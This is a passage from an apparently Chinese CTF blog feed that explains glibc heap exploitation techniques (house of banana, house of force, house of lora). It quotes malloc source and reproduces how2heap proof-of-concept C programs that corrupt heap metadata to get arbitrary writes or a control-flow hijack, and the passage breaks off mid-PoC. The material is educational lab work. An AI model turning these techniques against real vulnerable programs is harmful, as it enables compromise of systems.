(<span class="keyword">uint64_t</span> *)main_arena_96 + (<span class="number">0x259480</span> / <span class="number">8</span>);</span><br><span class="line">    target = (<span class="keyword">uint64_t</span> *)rtld_global_addr - <span class="number">0x4b128</span> / <span class="number">8</span>;</span><br><span class="line">    fake = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)fake, <span class="number">0</span>, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)target = (<span class="keyword">uint64_t</span>)fake;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x28</span> / <span class="number">8</span>) = fake;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x31c</span> / <span class="number">8</span>) = <span class="number">0x1c00000000</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x110</span> / <span class="number">8</span>) = fake + <span class="number">0x40</span> / <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x48</span> / <span class="number">8</span>) = fake + <span class="number">0x58</span> / <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x58</span> / <span class="number">8</span>) = (<span class="keyword">uint64_t</span>)shell;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x120</span> / <span class="number">8</span>) = fake + <span class="number">0x48</span> / <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x50</span> / <span class="number">8</span>) = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a class="link"   href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" >https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p><p>大佬这里最后的poc在除了上面我说的之外存在还一点小问题，应该是忘了给每个地址除以8</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这个堆利用方式相较于以往的利用方式存在利用目标的不同，这一方式的利用我感觉比较适合与glibc2.31之后，比较之前都可以直接用FSOP，但是在2.31之后FSOP的利用方式就是house of pig不过如果题目禁止了__free_hook之类的</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="fini" scheme="https://cv196082.gitee.io/tags/fini/"/>
    
    <category term="house of banana" scheme="https://cv196082.gitee.io/tags/house-of-banana/"/>
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>house of ******</title>
    <link href="https://cv196082.gitee.io/2022/03/03/house-of/"/>
    <id>https://cv196082.gitee.io/2022/03/03/house-of/</id>
    <published>2022-03-03T09:32:44.000Z</published>
    <updated>2022-03-07T04:54:05.992Z</updated>
    
    <content type="html"><![CDATA[<p>没错！标题的星号就是脏字！</p><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>这个堆利用的方式是控制top chunk，把top chunk跑到任意位置。</p><p>总所周知，在malloc的时候发现bin当中没有合适size的chunk的时候就去会割top chunk，那么是怎么隔的就看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>通过上面两个片段就很好可以看出来，只要我们top chunk的size大于我们申请的就会进入内部，然后注意<code>remainder = chunk_at_offset (victim, nb);</code>也就是当前的top chunk的地址加上申请的size，下面<code>av-&gt;top = remainder;</code>将地址赋值给top chunk，不过这里的问题则是如果我们后面给到一个负值，那么我们的top chunk就可以跑到任意地方了。所以来看看how2heap的poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line"><span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// some further discussion:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的poc很清楚了，可以下去-g调一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>以上片段是在glibc2.29当中新加的导致无法进行此种方法了。</p><h2 id="house-of-lora"><a href="#house-of-lora" class="headerlink" title="house of lora"></a>house of lora</h2><h3 id="Glibc2-23"><a href="#Glibc2-23" class="headerlink" title="Glibc2.23"></a>Glibc2.23</h3><p>这个攻击方式是针对small bin的攻击，先看源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面的操作是将最后一个chunk的bk赋值给bck，然后再把bin-&gt;bk=bck就把这个small bin chunk加入到了small bin中去了，不过需要绕过bck-&gt;fd!=victim，这里给出poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 